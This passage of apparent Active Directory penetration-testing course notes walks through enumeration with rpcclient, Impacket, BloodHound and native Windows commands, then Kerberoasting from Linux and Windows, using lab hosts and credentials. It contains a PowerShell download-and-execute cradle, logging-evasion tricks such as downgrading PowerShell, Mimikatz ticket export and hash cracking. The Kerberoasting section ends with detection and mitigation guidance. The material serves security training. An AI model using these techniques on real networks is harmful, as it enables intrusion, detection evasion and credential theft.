rpcclient $> queryuser [RID]
```
- Example for `htb-student` RID (0x457):
  ```bash
  rpcclient $> queryuser 0x457
  ```

#### **Explanation of SID and RID**
- Domain SID: `S-1-5-21-<unique domain identifier>`.
- User SID: Combines Domain SID with RID (e.g., `S-1-5-21-<unique domain ID>-1111`).

---

### **Using Impacket Toolkit**

#### **psexec.py**
-  Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.
- **Usage**:
  ```bash
  psexec.py [domain/user]:[password]@[target]
  ```
- Example:
  ```bash
  psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
  ```
- **Output**: Shell prompt with SYSTEM privileges on the target.

#### **wmiexec.py**
- Executes commands via Windows Management Instrumentation (WMI).
- **Usage**:
  ```bash
  wmiexec.py [domain/user]:[password]@[target]
  ```
- Example:
  ```bash
  wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
  ```
 this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command.
---

### **Using Windapsearch**
`windapsearch.py` performs LDAP queries to enumerate AD information.

#### **Help Menu**
```bash
python3 /opt/windapsearch/windapsearch.py -h
```

#### **Enumerate Domain Admins**
```bash
python3 /opt/windapsearch/windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
- **Output**: Lists members of the `Domain Admins` group.

#### **Enumerate Privileged Users**
```bash
python3 /opt/windapsearch/windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
- **Output**: Identifies privileged users, including those with nested group membership.

---

### **Tips for Effective Enumeration**
- **Save Outputs**: Redirect results to files for better analysis.
- **Combine Tools**: Use results from `rpcclient` with `windapsearch` or Impacket tools to correlate data.
- **Focus on Privileged Accounts**: Pay special attention to `Domain Admins`, nested group memberships, and service accounts.

## Bloodhound

**Introduction to BloodHound**
- **Purpose**: BloodHound is a powerful tool for auditing Active Directory security by creating graphical representations of access paths.
- **Components**: 
  - SharpHound collector (C# for Windows)
  - BloodHound.py collector (Python for Linux)
  - BloodHound GUI for data visualization and query execution

### Setting Up BloodHound.py
**Prerequisites**: Requires Impacket, ldap3, and dnspython.

### Running BloodHound.py
```bash
bloodhound-python -h

# Output shows various options:
# -h, --help            show this help message and exit
# -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD
# -u USERNAME, --username USERNAME
# -p PASSWORD, --password PASSWORD
```
- **Collection Methods**:
  - Group, LocalAdmin, Session, Trusts, Default (all previous), DCOnly (no computer connections), DCOM, RDP, PSRemote, LoggedOn, ObjectProps, ACL, All (all except LoggedOn)

### Executing BloodHound.py with Domain Credentials
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

# Example output:
# INFO: Found AD domain: inlanefreight.local
# INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# INFO: Found 1 domains
# INFO: Found 2 domains in the forest
# INFO: Found 564 computers
# INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# INFO: Found 2951 users
# INFO: Found 183 groups
# INFO: Found 2 trusts
# INFO: Starting computer enumeration with 10 workers
```
- **Explanation**: This command runs all checks using the specified domain credentials and domain controller.

### Viewing the Results
```bash
ls

# Output will show:
# 20220307163102_computers.json  
# 20220307163102_domains.json  
# 20220307163102_groups.json  
# 20220307163102_users.json
```
- **Explanation**: The output files are JSON files containing the collected data.

### Uploading Data to BloodHound GUI
1. **Start the Neo4j service**:
   ```bash
   sudo neo4j start
   ```
2. **Start BloodHound GUI**:
   ```bash
   bloodhound
   ```
   - **Credentials**: 
     - User: `neo4j`
     - Password: `HTB_@cademy_stdnt!`

3. **Upload Data**:
   ```bash
   zip -r ilfreight_bh.zip *.json
   ```
   - **Upload the Zip file** using the "Upload Data" button in the BloodHound GUI.

### Running Queries in BloodHound
- **Built-in Queries**: Use the Analysis tab to run pre-built queries.
- **Custom Cypher Queries**: Use custom Cypher queries for specific analysis.

### Example Query: Finding Shortest Paths to Domain Admins
- **Path Finding Queries**: Useful for identifying paths to escalate privileges to Domain Administrator.

**Exploring BloodHound GUI Features**:
- **Database Info Tab**: View detailed information about the database.
- **Node Info Tab**: Search for specific nodes like Domain Users.
- **Settings Menu**: Adjust how nodes and edges are displayed, enable query debug mode, and enable dark mode.

# Living OFF the Land

When traditional methods fail, "living off the land" utilizes native Windows tools and commands for stealthier enumeration. This approach minimizes log entries, reduces the chance of detection by monitoring tools, and aligns with scenarios where uploading external tools isn't feasible.

---

### **Scenario**
- Client request: Test AD environment from a managed host with no internet and no external tool uploads.
- Goal: Identify possible enumeration activities using only built-in tools, avoiding alerts from monitoring systems such as IDS/IPS or enterprise EDR.
- Strategy: Use native Windows utilities to explore the host and network configurations, maintain stealth, and minimize defender-triggered responses.

---

### **Host and Network Recon: Key Commands**

#### **Basic Enumeration Commands**
| Command                                   | Description                                                                                   |
|-------------------------------------------|-----------------------------------------------------------------------------------------------|
| `hostname`                                | Displays the PC's name.                                                                       |
| `[System.Environment]::OSVersion.Version` | Prints the OS version and revision level.                                                    |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lists applied patches and hotfixes.                                                           |
| `ipconfig /all`                           | Outputs network adapter configurations.                                                      |
| `set`                                     | Displays environment variables for the current session.                                       |
| `echo %USERDOMAIN%`                       | Prints the domain name of the host.                                                          |
| `echo %logonserver%`                      | Shows the name of the domain controller the host checks in with.                             |
| `systeminfo`                              | Provides a summary of host information in one tidy output (e.g., OS, domain, network details).|

---

### **Harnessing PowerShell for Advanced Recon**
PowerShell offers extensive capabilities for system and network reconnaissance.

#### **Essential PowerShell Cmdlets**
| Cmdlet                                             | Description                                                                                     |
|----------------------------------------------------|-------------------------------------------------------------------------------------------------|
| `Get-Module`                                       | Lists available modules.                                                                        |
| `Get-ExecutionPolicy -List`                        | Displays execution policies by scope.                                                          |
| `Set-ExecutionPolicy Bypass -Scope Process`        | Temporarily bypasses execution policy for the current session.                                  |
| `Get-ChildItem Env: | ft Key,Value`                | Lists environment variables with keys and values.                                               |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Retrieves PowerShell history for potential insights (e.g., scripts or passwords).               |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"` | Downloads and executes content directly in memory (if internet access is available).            |

---

### **Downgrading PowerShell for Stealth**
- **Rationale**: Versions prior to PowerShell 3.0 lack advanced logging features, such as Script Block Logging.
- **Steps**:
  1. Verify current version with `Get-Host`.
  2. Downgrade: `powershell.exe -version 2`.
  3. Confirm with `Get-Host` (Version should display `2.0`).

#### **Caveat**:
- Actions to downgrade (e.g., `powershell.exe -version 2`) are logged, but subsequent activity in version 2.0 is not.

---

### **Checking Host Defenses**
#### **Firewall Configuration**
- **Command**: `netsh advfirewall show allprofiles`
- **Key Insights**:
  - State: ON/OFF for domain, private, and public profiles.
  - Policies: Inbound/Outbound traffic rules.
  - Logging: Status of allowed/dropped connections.

#### **Windows Defender Status**
1. **Service Check** (CMD):
   - `sc query windefend`  
   - Checks if the Windows Defender service is running.
2. **Configuration Details** (PowerShell):
   - `Get-MpComputerStatus`  
   - Displays detailed Defender settings (e.g., real-time protection, signature versions, scanning schedules).

---

### **Am I Alone?**
- **Command**: `qwinsta`
- **Purpose**: Lists active user sessions to ensure actions won’t alert a logged-in user.
- **Output Example**:
  - `SESSIONNAME`: Console or remote session type.
  - `USERNAME`: Active user(s).

---

### **Network Enumeration**
#### **Key Networking Commands**
| Command               | Description                                                                                     |
|-----------------------|-------------------------------------------------------------------------------------------------|
| `arp -a`              | Lists ARP table entries (known hosts).                                                         |
| `ipconfig /all`       | Details network adapter configurations (e.g., IP, DNS, gateway).                               |
| `route print`         | Displays IPv4/IPv6 routing table (known routes to networks).                                   |
| `netsh advfirewall show allprofiles` | Displays firewall configuration settings.                                                |

#### **Analyzing ARP and Routing**
- **ARP Table (`arp -a`)**:
  - Identifies IP and MAC addresses of connected hosts.
  - Helps locate potential target devices.
- **Routing Table (`route print`)**:
  - Reveals known networks and possible lateral movement paths.
  - Persistent routes can indicate administratively-set paths or frequent access points.

---

### **Windows Management Instrumentation (WMI) and Domain Enumeration Techniques**

#### **WMI Overview**
WMI is a powerful scripting engine used in Windows environments for administrative tasks and information retrieval. It enables local and remote queries about users, groups, processes, and system configurations, making it invaluable for enumeration tasks.

---

### **WMI Commands**
| **Command** | **Description** |
|-------------|------------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lists applied patches and hotfixes. |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic system details. |
| `wmic process list /format:list` | Lists all running processes. |
| `wmic ntdomain list /format:list` | Provides details about the domain and domain controllers. |
| `wmic useraccount list /format:list` | Outputs all local and logged-in domain accounts. |
| `wmic group list /format:list` | Lists local groups. |
| `wmic sysaccount list /format:list` | Dumps service account information. |

---

### **Net Commands**
Net commands provide information about users, groups, and domain settings. They are versatile but may trigger alerts in monitored environments.

| **Command** | **Description** |
|-------------|------------------|
| `net accounts` | Displays local password policy. |
| `net accounts /domain` | Shows domain password and lockout policy. |
| `net group /domain` | Lists domain groups. |
| `net group "Domain Admins" /domain` | Lists users in the "Domain Admins" group. |
| `net user <ACCOUNT_NAME> /domain` | Retrieves details about a specific domain user. |
| `net user /domain` | Lists all domain users. |
| `net localgroup administrators /domain` | Displays members of the "Administrators" group. |
| `net view /domain` | Lists PCs in the domain. |
| `net view \computer /ALL` | Shows all shares on a specific computer. |

#### **Key Notes**:
- Use `net1` as a stealthy alternative to `net` commands in monitored environments.

---

### **Dsquery Commands**
`dsquery` enables Active Directory (AD) object searches. It's available on hosts with the AD Domain Services role and uses built-in DLLs.

| **Command** | **Description** |
|-------------|------------------|
| `dsquery user` | Lists all users in AD. |
| `dsquery computer` | Outputs all computers in AD. |
| `dsquery * "CN=Users,DC=DOMAIN,DC=LOCAL"` | Searches a specific OU for all objects. |
| `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl` | Finds users with the `PASSWD_NOTREQD` flag set. |
| `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName` | Lists five domain controllers in the current domain. |

#### **Search Customization**:
- Use LDAP filters (`objectClass=user`, etc.) with logical operators:
  - **&**: AND (`(&(criteria1)(criteria2))`).
  - **|**: OR (`(|(criteria1)(criteria2))`).
  - **!**: NOT (`(!criteria)`).

#### **Common LDAP Matching Rules**:
1. **`1.2.840.113556.1.4.803`**: Matches specific bit values exactly.
2. **`1.2.840.113556.1.4.804`**: Matches any bit in a chain.
3. **`1.2.840.113556.1.4.1941`**: Matches Distinguished Names across ownership/membership.

#### **Example Filters**:
- Search for users with **Password Can't Change**:  
  `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`
- Exclude users with **Password Can't Change**:  
  `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

---
### **UserAccountControl (UAC) Values and Their Corresponding Attributes**

The **UserAccountControl (UAC)** attribute in Active Directory defines specific properties of user accounts. These properties are stored as a bitmask, and each value corresponds to a particular attribute. The values can combine to represent multiple attributes simultaneously.

| **Value** | **Attribute**                                         | **Description**                                                                                   |
|-----------|-------------------------------------------------------|---------------------------------------------------------------------------------------------------|
| `2`       | **ACCOUNTDISABLE**                                    | The account is disabled.                                                                          |
| `8`       | **HOMEDIR_REQUIRED**                                  | A home directory is required.                                                                    |
| `16`      | **LOCKOUT**                                           | The account is locked out.                                                                       |
| `32`      | **PASSWD_NOTREQD**                                    | The account does not require a password.                                                         |
| `64`      | **PASSWD_CANT_CHANGE**                                | The user cannot change the password.                                                             |
| `128`     | **ENCRYPTED_TEXT_PWD_ALLOWED**                        | The account allows the storage of a reversible encrypted password.                               |
| `512`     | **NORMAL_ACCOUNT**                                    | A typical user account.                                                                          |
| `2048`    | **INTERDOMAIN_TRUST_ACCOUNT**                         | A domain trust account.                                                                          |
| `4096`    | **WORKSTATION_TRUST_ACCOUNT**                         | A computer account for a workstation or server.                                                  |
| `8192`    | **SERVER_TRUST_ACCOUNT**                              | A domain controller account.                                                                     |
| `65536`   | **DONT_EXPIRE_PASSWORD**                              | The password is set not to expire.                                                               |
| `131072`  | **SMARTCARD_REQUIRED**                                | The account requires a smart card for login.                                                     |
| `262144`  | **TRUSTED_FOR_DELEGATION**                            | The account is trusted for delegation.                                                           |
| `524288`  | **NOT_DELEGATED**                                     | The account cannot be delegated.                                                                 |
| `1048576` | **USE_DES_KEY_ONLY**                                  | The account is restricted to use only DES encryption types for keys.                             |

---

### **Combining UAC Values**
- UAC values can combine to represent multiple properties. For example:
  - A disabled account (`2`) that does not require a password (`32`) would have a UAC value of `34` (`2 + 32`).

# Kerberoasting from Linux:

#### **Overview**
Kerberoasting is a **lateral movement and privilege escalation technique** targeting Service Principal Names (SPNs) in Active Directory (AD). SPNs link services to service accounts, often requiring domain credentials for authentication. By requesting Kerberos service tickets (TGS-REPs), attackers can extract encrypted ticket data offline to attempt brute-force password cracking.

---

### **Core Concepts**
1. **SPNs and Their Role in Kerberos**:
   - SPNs uniquely identify a service instance running under a domain account.
   - Service accounts often have elevated privileges (e.g., local or domain admin).

2. **The Attack Workflow**:
   - Any domain user can request a TGS ticket for any SPN.
   - The TGS-REP ticket is encrypted with the service account’s NTLM hash.
   - Offline cracking of the TGS-REP can reveal the cleartext password.

3. **Common Weaknesses Exploited**:
   - Weak or reused passwords on service accounts.
   - Privileged service accounts with SPNs (e.g., SQL Server, SolarWinds).
   - Misconfigured SPNs linked to domain or enterprise administrator accounts.

4. **Potential Outcomes**:
   - **High Impact**: Privileged accounts like `Domain Admins` compromised.
   - **Low Impact**: Cracked passwords grant limited access but may help pivot within the domain.

---

### **Key Tools for Kerberoasting from Linux**
1. **Impacket Toolkit**:
   - Provides tools like `GetUserSPNs.py` to enumerate SPNs and request TGS tickets.
   - Can be used with domain credentials or NTLM hashes.

2. **Hashcat**:
   - Crack TGS tickets offline using GPU-powered password recovery.

3. **Additional Utilities**:
   - `crackmapexec`: Validate cracked credentials.
   - `rockyou.txt` or other password wordlists for brute-force attacks.

---

### **Steps for Performing Kerberoasting on Linux**

#### **1. Install Impacket**
```bash
 sudo python3 -m pip install .
```
- Installs Impacket's tools in the system's PATH for easy access.

---

#### **2. Enumerate SPNs with Valid Credentials**
Command:
```bash
 GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME>
```

Example Output:
| ServicePrincipalName                          | Name             | MemberOf              | PasswordLastSet   |
|-----------------------------------------------|------------------|-----------------------|-------------------|
| `backupjob/veam001.inlanefreight.local`       | `BACKUPAGENT`    | `Domain Admins`       | `2022-02-15`      |
| `sts/inlanefreight.local`                     | `SOLARWINDSMONITOR` | `Domain Admins`     | `2022-02-15`      |

---

#### **3. Request TGS Tickets**
Command:
```bash
 GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME> -request
```
Output includes SPNs and encrypted TGS tickets (e.g., `$krb5tgs$23$...`).

---

#### **4. Save Tickets to a File for Cracking**
Command:
```bash
 GetUserSPNs.py -dc-ip <DC-IP> <DOMAIN>/<USERNAME> -request -outputfile <FILE>
```

---

#### **5. Crack TGS Tickets with Hashcat**
Command:
```bash
 hashcat -m 13100 <FILE> /usr/share/wordlists/rockyou.txt
```

Example Cracked Password:
```plaintext
$krb5tgs$23$...:database!
```

---

#### **6. Test Access with Cracked Credentials**
Command:
```bash
 sudo crackmapexec smb <DC-IP> -u <USERNAME> -p <PASSWORD>
```

Example Output:
```plaintext
SMB         172.16.5.5      445    <DC_NAME>  [+] <DOMAIN>\<USERNAME>:<PASSWORD> (Pwn3d!)
```

---

# Kerberoasting: Windows

Kerberoasting is a post-exploitation technique used to extract and crack Kerberos tickets for sensitive service accounts in a Windows domain. Below is a detailed guide, providing both context and explanations for the commands involved in semi-manual and automated approaches.

---

### **1. Overview of Kerberoasting**
- **Purpose**: 
  - Retrieve Kerberos Ticket Granting Service (TGS) tickets for accounts with SPNs.
  - Crack the encrypted tickets offline to reveal plaintext passwords.
- **Prerequisites**:
  - A foothold in the target domain (valid credentials for a domain account).
  - Permission to request TGS tickets, which any authenticated domain user typically has.

---

### **2. Semi-Manual Method for Kerberoasting**

This approach is helpful when automated tools are unavailable or blocked. It combines built-in Windows tools and manual extraction methods.

---

#### **Step 1: Enumerate Service Principal Names (SPNs)**
- Use `setspn.exe` (a built-in Windows binary) to query the domain for SPNs.

```shell
 setspn.exe -Q */*
```

- **Explanation**:
  - The `-Q` flag queries for SPNs matching the wildcard `*/*`, which lists all SPNs in the domain.
  - SPNs are unique identifiers for services running under specific accounts (e.g., `MSSQLSvc`, `backupjob`).
  - Output includes **user accounts** and **computer accounts**. Focus on user accounts as these can have weak passwords.

---

#### **Step 2: Request TGS Tickets Using PowerShell**
- Request a TGS ticket for a specific SPN.

```powershell
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

- **Context and Explanation**:
  1. **Add-Type**: Loads the `.NET Framework` library into the PowerShell session, enabling access to advanced Kerberos classes.
     - **`System.IdentityModel`**: Namespace that includes Kerberos-related classes.
  2. **New-Object**:
     - Creates a `KerberosRequestorSecurityToken` object, requesting a TGS ticket for the specified SPN (`MSSQLSvc/DEV-PRE-SQL`).
     - The ticket is loaded into memory for further processing.

---

#### **Step 3: Extract Tickets from Memory with Mimikatz**
- Dump the loaded TGS tickets using Mimikatz.

```shell
mimikatz # kerberos::list /export
```

- **Explanation**:
  - The `kerberos::list` command lists all Kerberos tickets in memory.
  - The `/export` flag saves each ticket as a `.kirbi` file on disk.
  - These `.kirbi` files are encrypted but can be cracked offline.

---

#### **Step 4: Prepare Tickets for Cracking**
1. **Convert Base64-Encoded Tickets to .kirbi**:
   - If the ticket was exported in Base64 format, convert it to `.kirbi`.
   ```bash
   echo "<base64 blob>" | tr -d \\n | base64 -d > sqldev.kirbi
   ```
   - **Explanation**: This command removes line breaks and decodes the Base64 string into the `.kirbi` binary format.

2. **Extract Hashes for Cracking**:
   - Use `kirbi2john.py` to extract the Kerberos hash from the `.kirbi` file.
   ```bash
   python2.7 kirbi2john.py sqldev.kirbi > crack_file
   ```

3. **Format the Hash for Hashcat**:
   - Modify the extracted hash for compatibility with `hashcat`:
   ```bash
   sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
   ```

4. **Crack the Hash**:
   - Use `hashcat` to brute-force the hash offline:
   ```bash
   hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
   ```

- **Hashcat Context**:
  - **`-m 13100`**: Hashcat mode for cracking Kerberos 5 TGS-REP hashes using RC4 encryption.
  - **Wordlist**: A file like `rockyou.txt` is used for dictionary-based brute-forcing.

---

### **3. Automated Methods for Kerberoasting**

Automated tools simplify Kerberoasting by combining enumeration, ticket requests, and hash extraction into fewer steps.

---

#### **Using PowerView**
1. **Import PowerView Module**:
   - Load the PowerView script into the PowerShell session:
   ```powershell
    Import-Module .\PowerView.ps1
   ```

2. **Enumerate SPNs**:
   - List all SPN-enabled user accounts in the domain:
   ```powershell
    Get-DomainUser * -spn | select samaccountname
   ```

3. **Retrieve Tickets**:
   - Request a TGS ticket for a specific account and format it for `hashcat`:
   ```powershell
    Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
   ```

4. **Export All Tickets**:
   - Export tickets for all SPN-enabled accounts to a CSV file for offline processing:
   ```powershell
    Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
   ```

---

#### **Using Rubeus**
1. **Basic Kerberoasting**:
   - Request all TGS tickets in the domain:
   ```powershell
    .\Rubeus.exe kerberoast /nowrap
   ```
   - **Explanation**:
     - `/nowrap`: Ensures Base64 ticket blobs are not wrapped across multiple lines.

2. **Target Specific SPNs**:
   - Request a TGS ticket for a specific SPN:
   ```powershell
    .\Rubeus.exe kerberoast /spn:"MSSQLSvc/SQLSERVER"
   ```

3. **Filter by Admin Accounts**:
   - Target high-value accounts with the `admincount` attribute set:
   ```powershell
    .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
   ```

4. **View Statistics**:
   - View the encryption types and password last set dates for Kerberoastable accounts:
   ```powershell
    .\Rubeus.exe kerberoast /stats
   ```
---

### **1. Encryption Types in Kerberoasting**

#### **Encryption Type Overview**
- **RC4 (etype 23)**:
  - Easier and faster to crack.
  - Most Kerberoasting tools default to requesting RC4-encrypted tickets.
- **AES (etype 17/18)**:
  - AES-128 (etype 17) and AES-256 (etype 18) are much harder to crack due to stronger encryption.
  - Cracking AES-encrypted tickets requires significantly more resources and time.

#### **Example: Checking Encryption Type with PowerView**
```powershell
 Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

- **Output**:
  - **msds-supportedencryptiontypes = 0**: Defaults to RC4 encryption.
  - **msds-supportedencryptiontypes = 24**: Supports AES-128/256 encryption only.

---

### **2. Key Commands for Kerberoasting**

#### **Retrieve Tickets with RC4 Encryption**
- Use **Rubeus** to request TGS tickets for a target SPN account:
```powershell
 .\Rubeus.exe kerberoast /user:testspn /nowrap
```

- **Output**:
  - The hash will begin with `$krb5tgs$23$*`, indicating RC4 encryption.

#### **Retrieve AES-Encrypted Tickets**
- If the SPN account supports AES, tickets will begin with `$krb5tgs$18$*` (AES-256) or `$krb5tgs$17$*` (AES-128).

---

### **3. Cracking Kerberos Hashes**

#### **For RC4-Encrypted Tickets**
- Crack with Hashcat (etype 23, TGS-REP):
```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

#### **For AES-Encrypted Tickets**
- Crack with Hashcat (etype 18, TGS-REP for AES-256):
```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

---

### **4. Downgrading to RC4 Encryption**
- Use Rubeus to force RC4 encryption for accounts that support AES:
```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```
- **Note**: This method doesn’t work against Windows Server 2019 DCs, which enforce the highest available encryption type.

---

### **5. Detection and Mitigation**

#### **Detection**
1. **Enable Logging for Kerberos Service Ticket Operations**:
   - Group Policy → `Audit Kerberos Service Ticket Operations`.
2. **Monitor Event Logs**:
   - **Event ID 4769**: Kerberos service ticket was requested.
   - **Event ID 4770**: Kerberos service ticket was renewed.
   - High volume of 4769 logs in a short time may indicate Kerberoasting.

#### **Example Log Indicators**:
- **Ticket Encryption Type**:
  - **0x17**: RC4 encryption was used.
  - **0x12**: AES-256 encryption was used.
- **User Information**:
  - Logs may show the attacker (e.g., `htb-student`) requesting tickets for target accounts (e.g., `sqldev`).

---

#### **Mitigation Strategies**
1. **Strong Passwords**:
   - Use long, complex passwords for service accounts.
   - Avoid using dictionary words or weak phrases.
2. **Managed Service Accounts**:
   - Use **Managed Service Accounts (MSA)** or **Group Managed Service Accounts (gMSA)** with automatic password rotation.
3. **Restrict RC4 Encryption**:
   - Update Group Policy to remove RC4_HMAC_MD5 from allowed Kerberos encryption types.
   - Test extensively before implementing to prevent operational issues.
4. **Limit SPN Accounts**:
   - Avoid assigning SPNs to high-privileged accounts like Domain Admins.

---



